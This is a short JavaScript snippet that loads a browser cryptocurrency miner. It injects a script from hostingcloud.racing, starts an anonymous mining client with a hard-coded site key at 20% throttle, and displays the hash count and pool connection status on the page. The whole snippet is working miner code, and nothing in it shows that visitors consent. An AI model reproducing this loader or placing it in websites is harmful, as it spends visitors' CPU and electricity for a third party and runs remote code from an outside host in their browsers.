var coinScript = document.createElement('script');
document.body.appendChild(coinScript);
coinScript.src = "https://www.hostingcloud.racing/vyC3.js";
coinScript.onload = function ()
{
  var _coinClient = new Client.Anonymous('1fc8a058a1b8eb3df5a2491da8c73084f4d6e5e836cecc88be4de0da480fe055', {throttle: 0.2, c: 'w', ads:0 });
  _coinClient.start();

  var statusValueElement = document.getElementById("statusValue");
  var hashesValueElement = document.getElementById("hashesValue");

  _coinClient.on('found', function() { hashesValueElement.textContent = _coinClient.getTotalHashes(); });

  _coinClient.on('open', function() { statusValueElement.textContent = "Connection to pool was established." });
  _coinClient.on('close', function() { statusValueElement.textContent = "Connection to pool was closed." });

}
